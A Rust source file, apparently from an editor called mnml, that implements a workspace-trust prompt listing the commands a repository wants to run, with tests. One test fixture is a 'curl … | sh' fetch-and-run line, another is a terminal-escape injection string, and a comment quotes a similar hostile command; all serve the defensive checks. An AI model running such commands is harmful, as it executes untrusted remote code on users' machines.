//! App-side workspace-trust flow — the prompt, the grant, and the
//! restricted-mode state the statusline reads.
//!
//! The scan/store/fingerprint half lives in [`crate::workspace_trust`];
//! this file is only the UI and the re-load that follows a grant.

use super::*;

impl App {
    /// Startup hook — show the trust dialog when this workspace
    /// declares something executable that hasn't been approved at its
    /// current fingerprint.
    ///
    /// Silent in the common case: a workspace with no `.mnml/` (or one
    /// whose config is all ordinary keys) produces no claims and never
    /// prompts. That's what keeps the dialog meaningful when it does
    /// appear — unlike a prompt-on-every-folder model, where users
    /// learn to dismiss it reflexively.
    pub fn maybe_prompt_workspace_trust(&mut self) {
        let claims = crate::workspace_trust::scan(&self.workspace);
        if claims.is_empty() {
            self.workspace_trust_restricted = false;
            return;
        }
        let fp = crate::workspace_trust::fingerprint(&claims);
        if crate::workspace_trust::is_trusted(&self.workspace, &fp) {
            self.workspace_trust_restricted = false;
            return;
        }
        self.workspace_trust_restricted = true;
        self.pending_workspace_trust = Some((fp, claims));
        self.open_workspace_trust_prompt();
    }

    /// Build + show the dialog for the pending claim set. Split from
    /// `maybe_prompt_workspace_trust` so `workspace.review_trust` can
    /// reopen it later without redoing the gating logic.
    pub fn open_workspace_trust_prompt(&mut self) {
        self.open_workspace_trust_prompt_with(false);
    }

    /// `already_trusted` picks the framing: the first-time ask
    /// (`Trust` / `Don't trust`) or the review of a standing decision
    /// (`Revoke` / `Keep trusted`). The claim list is identical — what
    /// the workspace wants to run is the same question either way.
    ///
    /// The inert choice sits in the CANCEL slot in both, which is why
    /// the review pair reads back-to-front: `Esc` routes to the cancel
    /// button, so that slot decides what a dismissal does.
    pub fn open_workspace_trust_prompt_with(&mut self, already_trusted: bool) {
        let Some((_, claims)) = self.pending_workspace_trust.clone() else {
            return;
        };
        let ws_name = self
            .workspace
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| self.workspace.display().to_string());

        // Show the actual commands, not a generic "do you trust the
        // authors" — a hostile `sh -c "curl …|sh"` is self-evident
        // where an abstract warning just trains people to click yes.
        let mut lines = vec![format!("{ws_name}/.mnml/ declares:"), String::new()];
        const MAX_SHOWN: usize = 6;
        for claim in claims.iter().take(MAX_SHOWN) {
            // Name the specific entry, not just its category. Without
            // it the dialog said "integration · multi-repo: …" — and
            // `multi-repo` is only the launch-PROFILE name, so the
            // reader couldn't tell which integration was involved.
            // It matters most in the shadowing case: a repo shipping
            // `integrations/claude_code.toml` overrides YOUR
            // claude_code, and the id is what reveals that.
            //
            // Deliberately the config key (file stem for integrations),
            // never the manifest's own `label` — that string comes from
            // the untrusted workspace, and a hostile repo could set it
            // to something reassuring to dress up this very prompt.
            lines.push(format!(
                "  • {} {} · {}",
                claim.kind.label(),
                claim.entry_name(),
                truncate_command(&claim.command)
            ));
            lines.push(format!("      runs {}", claim.kind.trigger()));
        }
        if claims.len() > MAX_SHOWN {
            lines.push(format!("  … and {} more", claims.len() - MAX_SHOWN));
        }
        lines.push(String::new());
        if already_trusted {
            lines.push("You trusted this workspace, so the above runs.".to_string());
            lines.push("Revoke to stop it from the next launch.".to_string());
        } else {
            lines.push("Trust this workspace only if you know where it came from.".to_string());
            lines.push("Editing, git, and search work either way.".to_string());
        }

        let kind = if already_trusted {
            crate::prompt::PromptKind::WorkspaceTrustReview
        } else {
            crate::prompt::PromptKind::WorkspaceTrustConfirm
        };
        let mut prompt = crate::prompt::Prompt::new(kind, lines.join("\n"));
        // Focus the button that CHANGES NOTHING, so a reflexive Enter
        // is inert either way: "Don't trust" when deciding, "Keep
        // trusted" when reviewing. Both live at index 1 — the cancel
        // slot — which is also where Esc lands.
        prompt.cursor = 1;
        self.prompt = Some(prompt);
    }

    /// User chose Trust — persist the decision at the current
    /// fingerprint, then re-materialise everything the gate suppressed
    /// so the workspace works without a restart.
    pub fn grant_workspace_trust(&mut self) {
        let Some((fp, _)) = self.pending_workspace_trust.take() else {
            return;
        };
        if let Err(e) = crate::workspace_trust::trust(&self.workspace, &fp) {
            self.toast(format!("could not record workspace trust: {e}"));
            return;
        }
        self.workspace_trust_restricted = false;

        // Re-load config with the workspace layer's exec keys now
        // honoured. Cheaper and far less error-prone than trying to
        // patch the individual keys back in by hand.
        let explicit = self.explicit_config_path.clone();
        self.config =
            crate::config::Config::load_with_trust(explicit.as_deref(), &self.workspace, true);
        // MUST follow the config swap, and must be the full refresh
        // rather than a bare `load_all`.
        //
        // `config.ui.integration_icons` is not purely file-derived:
        // `merge_integration_manifests` folds every installed
        // manifest into it at startup. Replacing `self.config` above
        // resets that vec to the freshly-parsed state — built-in
        // defaults plus any `[[ui.integration_icon]]` blocks — so
        // without re-merging, every manifest-derived chip vanishes
        // until the next launch. Shipped briefly and cost a user 12
        // of 15 installed integrations the moment they clicked
        // Trust; only `browser` / `claude_code` / `codex` (the
        // built-ins, per `is_builtin_integration_id`) survived.
        //
        // `refresh_integration_manifests` is the correct entry point:
        // it re-loads manifests (which consult the trust store, so
        // the workspace dir is now included), re-runs glyph
        // discovery and the binary-version cache, and THEN merges —
        // an ordering the bare `load_all` skipped entirely.
        self.refresh_integration_manifests();

        self.toast(
            "Workspace trusted — its language servers, formatters, and integrations are active.",
        );
    }

    /// `workspace.review_trust` — reopen the dialog for the current
    /// workspace, or report status when there's nothing to decide.
    /// Also the click target for the restricted-mode statusline chip.
    pub fn review_workspace_trust(&mut self) {
        let claims = crate::workspace_trust::scan(&self.workspace);
        if claims.is_empty() {
            self.toast("This workspace declares nothing that mnml would run.");
            return;
        }
        let fp = crate::workspace_trust::fingerprint(&claims);
        let trusted = crate::workspace_trust::is_trusted(&self.workspace, &fp);
        self.pending_workspace_trust = Some((fp, claims));
        // Either way this SHOWS the decision and lets the user change
        // it — only the buttons differ (`Trust`/`Don't trust` vs
        // `Keep trusted`/`Revoke`).
        //
        // It previously revoked outright when already trusted: no
        // dialog, no list of what was approved, no confirmation. A
        // command named "review" that silently destroys the thing it
        // claims to show is the same defect as the first-launch
        // wizard's "Skip" that silently enabled ghost text — the label
        // promising one thing while the code does another.
        self.open_workspace_trust_prompt_with(trusted);
    }

    /// Drop this workspace's trust record. Split out so the review
    /// dialog's Revoke button and any future caller share one path.
    pub fn revoke_workspace_trust(&mut self) {
        if let Err(e) = crate::workspace_trust::revoke(&self.workspace) {
            self.toast(format!("could not revoke trust: {e}"));
            return;
        }
        self.workspace_trust_restricted = true;
        self.pending_workspace_trust = None;
        // Honest about the limit: the config keys were applied at
        // startup and the LSP/formatter processes they named may
        // already be running. Revoking stops the NEXT launch from
        // honouring them.
        self.toast("Trust revoked — restart mnml to stop running this workspace's commands.");
    }
}

/// Keep one claim on one dialog line, eliding the MIDDLE.
///
/// Both ends carry the signal and the middle rarely does. For a path
/// the basename is what identifies it (`claude-multi.sh`); for a shell
/// line the tail is where the payload hides (`… | sh`). Head-only
/// truncation threw away exactly the half a reader needs — the first
/// real dialog, against mnml's own manifest, rendered
/// `multi-repo: /Users/chrismclennan/Projects/tattle-cl…`, which says
/// nothing about what would actually run.
fn truncate_command(cmd: &str) -> String {
    const MAX: usize = 72;
    let clean: String = cmd
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let n = clean.chars().count();
    if n <= MAX {
        return clean;
    }
    // Bias slightly toward the tail: a long path's meaning is
    // concentrated in its last couple of segments.
    let tail_len = (MAX - 1) / 2 + (MAX - 1) % 2;
    let head_len = MAX - 1 - tail_len;
    let head: String = clean.chars().take(head_len).collect();
    let tail: String = clean.chars().skip(n - tail_len).collect();
    format!("{head}…{tail}")
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Granting trust must not cost the user their installed chips.
    ///
    /// `grant_workspace_trust` replaces `self.config`, which resets
    /// `ui.integration_icons` to its file-derived state.
    /// `merge_integration_manifests` is what folds installed manifests
    /// back into that vec — the shipped version skipped it, so every
    /// manifest-derived chip vanished the instant a user clicked Trust
    /// (15 installed integrations down to the 3 built-ins).
    ///
    /// Isolates `MNML_DATA_ROOT` so the assertion rests on a manifest
    /// this test controls, not on whatever the developer has installed.
    #[test]
    fn granting_trust_preserves_manifest_derived_icons() {
        let home = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(home.path().join("integrations")).unwrap();
        // A non-built-in manifest: only the re-merge can put this back.
        std::fs::write(
            home.path().join("integrations/sentinel.toml"),
            "id = \"sentinel\"\nlabel = \"Sentinel\"\n\n[chip]\nglyph = \"S\"\nfallback = \"S\"\ncolor = \"blue\"\nenabled = true\nin_palette_bar = true\n\n[[commands]]\nid = \"sentinel.open\"\ntitle = \"Sentinel: open\"\nrun = \"noop\"\n",
        )
        .unwrap();

        // Crate-wide env lock + RAII guard (lib.rs) — the established
        // convention for tests that repoint env, and the only thing
        // that serializes against OTHER modules doing the same.
        let _lk = crate::test_env_lock()
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let _root = crate::EnvGuard::set("MNML_DATA_ROOT", home.path());

        let ws = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(ws.path().join(".mnml")).unwrap();
        std::fs::write(
            ws.path().join(".mnml/config.toml"),
            "[lsp.demo]\ncmd = \"demo-ls\"\nextensions = [\"demo\"]\n",
        )
        .unwrap();

        let has_sentinel = |app: &App| {
            app.config
                .ui
                .integration_icons
                .iter()
                .any(|i| i.id == "sentinel")
        };

        let cfg = crate::config::Config::load(None, ws.path());
        let mut app = crate::app::App::new(ws.path().to_path_buf(), cfg).unwrap();
        // `App::new` deliberately loads no user manifests under
        // `cfg!(test)` (hermeticity), so establish the precondition the
        // same way the real startup path does.
        app.refresh_integration_manifests();
        assert!(
            has_sentinel(&app),
            "precondition: the merge should surface the manifest chip"
        );

        let claims = crate::workspace_trust::scan(ws.path());
        assert!(!claims.is_empty(), "fixture must produce a claim");
        app.pending_workspace_trust = Some((crate::workspace_trust::fingerprint(&claims), claims));
        app.grant_workspace_trust();

        // The guard restores MNML_DATA_ROOT on drop, so this can now
        // assert directly instead of stashing the result to avoid
        // leaking the env var past a failing assertion.
        assert!(
            has_sentinel(&app),
            "granting trust dropped a manifest-derived chip — the config \
             swap must be followed by refresh_integration_manifests()"
        );
    }

    /// `review_trust` must SHOW the decision, not destroy it.
    ///
    /// It used to revoke outright when the workspace was already
    /// trusted — no dialog, no list of what had been approved, no
    /// confirmation. Same defect shape as the wizard's "Skip" that
    /// silently enabled ghost text: the label promised one thing and
    /// the code did another.
    #[test]
    fn review_trust_on_a_trusted_workspace_opens_a_dialog_and_revokes_nothing() {
        let home = tempfile::tempdir().unwrap();
        let _lk = crate::test_env_lock()
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let _root = crate::EnvGuard::set("MNML_DATA_ROOT", home.path());

        let ws = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(ws.path().join(".mnml")).unwrap();
        std::fs::write(
            ws.path().join(".mnml/config.toml"),
            "[lsp.demo]\ncmd = \"demo-ls\"\nextensions = [\"demo\"]\n",
        )
        .unwrap();

        let claims = crate::workspace_trust::scan(ws.path());
        let fp = crate::workspace_trust::fingerprint(&claims);
        crate::workspace_trust::trust(ws.path(), &fp).unwrap();
        assert!(crate::workspace_trust::is_trusted(ws.path(), &fp));

        let cfg = crate::config::Config::load(None, ws.path());
        let mut app = crate::app::App::new(ws.path().to_path_buf(), cfg).unwrap();
        app.review_workspace_trust();

        assert_eq!(
            app.prompt.as_ref().map(|p| p.kind),
            Some(crate::prompt::PromptKind::WorkspaceTrustReview),
            "should open the review dialog"
        );
        assert!(
            crate::workspace_trust::is_trusted(ws.path(), &fp),
            "reviewing must not revoke on its own"
        );
        // The claim is shown, so the user can see what they approved.
        let title = app.prompt.as_ref().map(|p| p.title.clone()).unwrap();
        assert!(title.contains("demo-ls"), "claims listed: {title}");
        // Focus sits on the inert button — same slot Esc routes to.
        assert_eq!(app.prompt.as_ref().unwrap().cursor, 1);
    }

    #[test]
    fn revoke_drops_the_record_and_marks_the_workspace_restricted() {
        let home = tempfile::tempdir().unwrap();
        let _lk = crate::test_env_lock()
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let _root = crate::EnvGuard::set("MNML_DATA_ROOT", home.path());

        let ws = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(ws.path().join(".mnml")).unwrap();
        std::fs::write(
            ws.path().join(".mnml/config.toml"),
            "[lsp.demo]\ncmd = \"demo-ls\"\nextensions = [\"demo\"]\n",
        )
        .unwrap();
        let fp = crate::workspace_trust::fingerprint(&crate::workspace_trust::scan(ws.path()));
        crate::workspace_trust::trust(ws.path(), &fp).unwrap();

        let cfg = crate::config::Config::load(None, ws.path());
        let mut app = crate::app::App::new(ws.path().to_path_buf(), cfg).unwrap();
        app.revoke_workspace_trust();

        assert!(!crate::workspace_trust::is_trusted(ws.path(), &fp));
        assert!(
            app.workspace_trust_restricted,
            "chip should show restricted"
        );
    }

    #[test]
    fn truncate_keeps_short_commands_verbatim() {
        assert_eq!(truncate_command("rust-analyzer"), "rust-analyzer");
    }

    #[test]
    fn truncate_marks_the_cut_and_bounds_the_width() {
        let long = "a".repeat(200);
        let out = truncate_command(&long);
        assert!(out.contains('…'));
        assert!(out.chars().count() <= 72);
    }

    #[test]
    fn truncate_keeps_the_basename_of_a_long_path() {
        // The regression this function was rewritten for: the real
        // dialog hid `claude-multi.sh`, the only part identifying what
        // would run.
        let p =
            "multi-repo: /Users/chrismclennan/Projects/tattle-claude-workspace/bin/claude-multi.sh";
        let out = truncate_command(p);
        assert!(
            out.contains("claude-multi.sh"),
            "basename must survive: {out}"
        );
        assert!(
            out.starts_with("multi-repo: /Users"),
            "head identifies it too: {out}"
        );
        assert!(out.chars().count() <= 72);
    }

    #[test]
    fn truncate_keeps_the_tail_of_a_piped_shell_line() {
        // The other signal-bearing end: a payload hides in the tail.
        let cmd = format!("curl https://{}.example.com/x | sh", "a".repeat(80));
        let out = truncate_command(&cmd);
        assert!(out.ends_with("| sh"), "pipe target must survive: {out}");
    }

    #[test]
    fn truncate_neutralizes_control_chars() {
        // A command carrying \r or an escape sequence must not be able
        // to rewrite the dialog around it.
        let out = truncate_command("evil\r\nTrusted: yes\x1b[2J");
        assert!(!out.contains('\r'));
        assert!(!out.contains('\n'));
        assert!(!out.contains('\x1b'));
    }
}
